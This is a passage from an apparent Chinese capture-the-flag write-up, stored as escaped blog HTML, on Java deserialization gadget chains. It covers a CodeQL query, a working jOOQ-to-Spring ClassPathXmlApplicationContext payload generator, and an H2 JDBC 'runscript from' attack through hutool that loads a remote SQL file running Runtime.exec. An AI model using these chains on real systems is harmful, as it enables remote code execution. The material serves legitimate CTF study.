class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Source</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123;</span><br><span class=\"line\">    Source()&#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getName().indexOf(<span class=\"string\">&quot;get&quot;</span>) = <span class=\"number\">0</span> and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getName().length() &gt; <span class=\"number\">3</span> and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.isPublic() and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.fromSource() and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.hasNoParameters()</span><br><span class=\"line\">        and</span><br><span class=\"line\">        <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getQualifiedName().matches(<span class=\"string\">&quot;%jooq%&quot;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Sink</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123;</span><br><span class=\"line\">    Sink()&#123;</span><br><span class=\"line\">        exists(MethodAccess ac|  </span><br><span class=\"line\">            ac.getMethod().getName().matches(<span class=\"string\">&quot;%newInstance%&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            ac.getMethod().getNumberOfParameters() = <span class=\"number\">1</span> </span><br><span class=\"line\">            and</span><br><span class=\"line\">            <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getQualifiedName().matches(<span class=\"string\">&quot;%jooq%&quot;</span>)</span><br><span class=\"line\">            <span class=\"type\">and</span> </span><br><span class=\"line\">            <span class=\"variable\">this</span> <span class=\"operator\">=</span> ac.getCaller() </span><br><span class=\"line\">        )</span><br><span class=\"line\">        and</span><br><span class=\"line\">        <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">query predicate <span class=\"title function_\">edges</span><span class=\"params\">(Method a, Method b)</span> &#123; </span><br><span class=\"line\">    a.polyCalls(b)and</span><br><span class=\"line\">    (a.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or a.isStatic()) and</span><br><span class=\"line\">    (b.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or b.isStatic()) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from Source source, Sink sink</span><br><span class=\"line\">where edges+(source, sink)</span><br><span class=\"line\">select source, source, sink, <span class=\"string\">&quot;$@ $@ to $@ $@&quot;</span> ,</span><br><span class=\"line\">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class=\"line\">source,source.getName(),</span><br><span class=\"line\">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class=\"line\">sink,sink.getName()</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213151447092.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213151447092.png\"  alt=\"image-20241213151447092\" lazyload></a></p>\n<h3 id=\"链子分析\"><a href=\"#链子分析\" class=\"headerlink\" title=\"链子分析\"></a>链子分析</h3><p>我们还是从sink to source方向分析。<br>Convert$ConvertAll.from() </p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133621747.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133621747.png\"  alt=\"image-20241213133621747\" lazyload></a></p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213125644892.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213125644892.png\"  alt=\"image-20241213125644892\" lazyload></a></p>\n<p>代码大致逻辑就是获取 toClass 的 Constructor ，获取 Constructor 的 ParameterType 。将from作为参数。然后实例化。</p>\n<p>我们需要将 constructor 设为 ClassPathXmlApplicationContext。再往前看就是这个类的 toClass属性。然后里面的这个参数需要通过 <code>Convert.convert(from, types[0])</code> 获取。</p>\n<p>跟进 <code>Convert.convert()</code>。返回的就是我们的 from。这个from需要是是一个Object类，然后值为<code>http://127.0.0.1:7777/poc.xml</code></p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png\"  alt=\"image-20241213133224054\" lazyload></a></p>\n<p>然后看ConvertAll的构造函数，并看到了toClass如何赋值的。还有就是我们的这个from需要传入进来。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213130234507.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213130234507.png\"  alt=\"image-20241213130234507\" lazyload></a></p>\n<p>Sink2Source，然后我们继续往上找。</p>\n<p>还是 Convert.convert() ，但是这次走的时else分支。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png\"  alt=\"image-20241213133224054\" lazyload></a></p>\n<p>在实例化的时候对我们toClass属性进行赋值。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134519741.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134519741.png\"  alt=\"image-20241213134519741\" lazyload></a></p>\n<p>最后调用到ConvertAll的from。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134622868.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134622868.png\"  alt=\"image-20241213134622868\" lazyload></a></p>\n<p>Sink2Source，继续找</p>\n<p>AbstractDataType.convert()</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154104453.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154104453.png\"  alt=\"image-20241213154104453\" lazyload></a></p>\n<p>AbstractDataType 没有 getType 方法。我们找一下它的继承关系。然后找到了DefaultDataType这个类的getType 方法。返回的是这个类的uType属性。然后这个object也就是我们上面说的那个from变量。需要是Object类，然后值为<code>http://127.0.0.1:7777/poc.xml</code></p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154143689.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154143689.png\"  alt=\"image-20241213154143689\" lazyload></a></p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154348497.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154348497.png\"  alt=\"image-20241213154348497\" lazyload></a></p>\n<p>Sink2Source，继续找</p>\n<p>ConvertedVal.getValue() </p>\n<p>然后这个 delegate.getValue() 是 <code>http://127.0.0.1:7777/poc.xml</code> 然后这个getDataType需要是DefaultDataType。我们这里初始化这个类用它的子类TableDataType。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154655516.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154655516.png\"  alt=\"image-20241213154655516\" lazyload></a></p>\n<h3 id=\"构造\"><a href=\"#构造\" class=\"headerlink\" title=\"构造\"></a>构造</h3><p>然后我们将codeql分析的这部分进行构造。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz1</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.Dual&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Constructor</span> <span class=\"variable\">constructor1</span> <span class=\"operator\">=</span> clazz1.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">constructor1.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">table</span> <span class=\"operator\">=</span> constructor1.newInstance();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz2</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.TableDataType&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Constructor</span> <span class=\"variable\">constructor2</span> <span class=\"operator\">=</span> clazz2.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">constructor2.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">tableDataType</span> <span class=\"operator\">=</span> constructor2.newInstance(table);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz3</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.Val&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Constructor</span> <span class=\"variable\">constructor3</span> <span class=\"operator\">=</span> clazz3.getDeclaredConstructor(Object.class, DataType.class, <span class=\"type\">boolean</span>.class);</span><br><span class=\"line\">constructor3.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">val</span> <span class=\"operator\">=</span> constructor3.newInstance(<span class=\"string\">&quot;whatever&quot;</span>, tableDataType, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">clazz4</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.ConvertedVal&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Constructor</span> <span class=\"variable\">constructor4</span> <span class=\"operator\">=</span> clazz4.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">constructor4.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">convertedVal</span> <span class=\"operator\">=</span> constructor4.newInstance(val, tableDataType);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;http://127.0.0.1:7777/poc.xml&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">type</span> <span class=\"operator\">=</span> ClassPathXmlApplicationContext.class;</span><br><span class=\"line\"></span><br><span class=\"line\">ReflectUtil.setFieldValue(val, <span class=\"string\">&quot;value&quot;</span>, value);</span><br><span class=\"line\">ReflectUtil.setFieldValue(tableDataType, <span class=\"string\">&quot;uType&quot;</span>, type);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> convertedVal.getClass().getMethod(<span class=\"string\">&quot;getValue&quot;</span>);</span><br><span class=\"line\">m.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">m.invoke(convertedVal);</span><br></pre></td></tr></table></figure>\n\n<p>最终的poc就如官方给的那样。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PocServer</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        gen(<span class=\"string\">&quot;http://127.0.0.1:7777/poc.xml&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">gen</span><span class=\"params\">(String url)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz1</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.Dual&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">constructor1</span> <span class=\"operator\">=</span> clazz1.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">        constructor1.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">table</span> <span class=\"operator\">=</span> constructor1.newInstance();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz2</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.TableDataType&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">constructor2</span> <span class=\"operator\">=</span> clazz2.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">        constructor2.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">tableDataType</span> <span class=\"operator\">=</span> constructor2.newInstance(table);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz3</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.Val&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">constructor3</span> <span class=\"operator\">=</span> clazz3.getDeclaredConstructor(Object.class, DataType.class, <span class=\"type\">boolean</span>.class);</span><br><span class=\"line\">        constructor3.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">val</span> <span class=\"operator\">=</span> constructor3.newInstance(<span class=\"string\">&quot;whatever&quot;</span>, tableDataType, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz4</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;org.jooq.impl.ConvertedVal&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">constructor4</span> <span class=\"operator\">=</span> clazz4.getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">        constructor4.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">convertedVal</span> <span class=\"operator\">=</span> constructor4.newInstance(val, tableDataType);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> url;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">type</span> <span class=\"operator\">=</span> ClassPathXmlApplicationContext.class;</span><br><span class=\"line\"></span><br><span class=\"line\">        ReflectUtil.setFieldValue(val, <span class=\"string\">&quot;value&quot;</span>, value);</span><br><span class=\"line\">        ReflectUtil.setFieldValue(tableDataType, <span class=\"string\">&quot;uType&quot;</span>, type);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">        ClassPool.getDefault().appendClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class=\"line\">        <span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">        ctClass.removeMethod(ctMethod);</span><br><span class=\"line\">        ctClass.toClass();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">POJONode</span> <span class=\"variable\">pojoNode</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">POJONode</span>(convertedVal);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">EventListenerList</span> <span class=\"variable\">eventListenerList</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">EventListenerList</span>();</span><br><span class=\"line\">        <span class=\"type\">UndoManager</span> <span class=\"variable\">undoManager</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UndoManager</span>();</span><br><span class=\"line\">        <span class=\"type\">Vector</span> <span class=\"variable\">vector</span> <span class=\"operator\">=</span> (Vector) ReflectUtil.getFieldValue(undoManager, <span class=\"string\">&quot;edits&quot;</span>);</span><br><span class=\"line\">        vector.add(pojoNode);</span><br><span class=\"line\">        ReflectUtil.setFieldValue(eventListenerList, <span class=\"string\">&quot;listenerList&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;InternalError.class, undoManager&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">byte</span>[] data = SerializeUtil.serialize(eventListenerList);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(Base64.getEncoder().encodeToString(data));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"codeql-database\"><a href=\"#codeql-database\" class=\"headerlink\" title=\"codeql database\"></a>codeql database</h1><p>hutool和jooq的数据库都是 通过github action 直接生成的。但是导入mac 的话是无法成功的，但是windows可以。</p>\n<p><a href=\"https://www.cnblogs.com/kingbridge/articles/18100619\">https://www.cnblogs.com/kingbridge/articles/18100619</a></p>\n<p>jdk的数据库虽然题目是jdk17的，但是我用的是jdk8的数据库。这位作者已经弄好了，直接用即可。</p>\n<p><a href=\"https://blog.csdn.net/mole_exp/article/details/122330521\">https://blog.csdn.net/mole_exp/article/details/122330521</a></p>\n<p>题目比较久远了，这里附上题目的附件。</p>\n<p><a href=\"https://pan.baidu.com/s/1FnsS0vMr3mR93yL-rY3NaA?pwd=1234\">https://pan.baidu.com/s/1FnsS0vMr3mR93yL-rY3NaA?pwd=1234</a></p>\n<h1 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h1><p>其实这个算不上是污点追踪，因为每一个类的里面的每一个属性都是可以通过反射或者一些其它的方式来进行赋值的。和我的另一篇文章其实不太一样。<a href=\"https://xz.aliyun.com/t/16468\">https://xz.aliyun.com/t/16468</a></p>\n<p>参考</p>\n<p><a href=\"https://xz.aliyun.com/t/14190\">https://xz.aliyun.com/t/14190</a></p>\n<p><a href=\"https://xz.aliyun.com/t/15487\">https://xz.aliyun.com/t/15487</a></p>\n<p><a href=\"https://xz.aliyun.com/t/14298\">https://xz.aliyun.com/t/14298</a></p>\n","excerpt":"","more":"<h1 id=\"agent\"><a href=\"#agent\" class=\"headerlink\" title=\"agent\"></a>agent</h1><h2 id=\"sink-h2-jdbc-attack\"><a href=\"#sink-h2-jdbc-attack\" class=\"headerlink\" title=\"sink h2 jdbc attack\"></a>sink h2 jdbc attack</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>cn.hutool<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>hutool-all<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.8.16<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>poc.sql</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> ALIAS <span class=\"keyword\">EXEC</span> <span class=\"keyword\">AS</span> <span class=\"string\">&#x27;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return &quot;su18&quot;;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">CALL</span> <span class=\"keyword\">EXEC</span> (<span class=\"string\">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>attack</p>\n<h3 id=\"official\"><a href=\"#official\" class=\"headerlink\" title=\"official\"></a>official</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Unsafe</span> <span class=\"variable\">unsafe</span> <span class=\"operator\">=</span> (Unsafe) ReflectUtil.getFieldValue(<span class=\"literal\">null</span>, ReflectUtil.getField(Unsafe.class, <span class=\"string\">&quot;theUnsafe&quot;</span>));</span><br><span class=\"line\"><span class=\"type\">PooledDSFactory</span> <span class=\"variable\">pooledDSFactory</span> <span class=\"operator\">=</span> (PooledDSFactory) unsafe.allocateInstance(PooledDSFactory.class);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Setting</span> <span class=\"variable\">setting</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Setting</span>();</span><br><span class=\"line\">setting.set(<span class=\"string\">&quot;url&quot;</span>,url);</span><br><span class=\"line\">ReflectUtil.setFieldValue(pooledDSFactory,<span class=\"string\">&quot;setting&quot;</span>,setting);</span><br><span class=\"line\">HashMap&lt;Object, Object&gt; dsmap = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">ReflectUtil.setFieldValue(pooledDSFactory,<span class=\"string\">&quot;dsMap&quot;</span>,dsmap);</span><br><span class=\"line\"></span><br><span class=\"line\">pooledDSFactory.getDataSource().getConnection();</span><br></pre></td></tr></table></figure>\n\n<p>unsafe.allocateInstance 这里主要是用来构造一个类。</p>\n<p>ReflectUtil.setFieldValue  是hutool里面特有的用来反射用的。师傅们也可以用自己平时封装好的。</p>\n<h3 id=\"my-own\"><a href=\"#my-own\" class=\"headerlink\" title=\"my own\"></a>my own</h3><p>当然其实也不必像官方wp系的那样复杂。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">Setting</span> <span class=\"variable\">setting</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Setting</span>();</span><br><span class=\"line\">setting.set(<span class=\"string\">&quot;url&quot;</span>,url);</span><br><span class=\"line\"><span class=\"type\">PooledDSFactory</span> <span class=\"variable\">pooledDSFactory</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PooledDSFactory</span>(setting);</span><br><span class=\"line\">pooledDSFactory.getDataSource().getConnection();</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"sink点的选择\"><a href=\"#sink点的选择\" class=\"headerlink\" title=\"sink点的选择\"></a>sink点的选择</h3><p>至于为什么不选择jdk原生的getConnection来作为sink点，我感觉还是因为这个地方没有提供一个实例吧。就仅仅是加载驱动，然后连接。hutool 给了我们一个很好的这样的sink点。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class.forName(<span 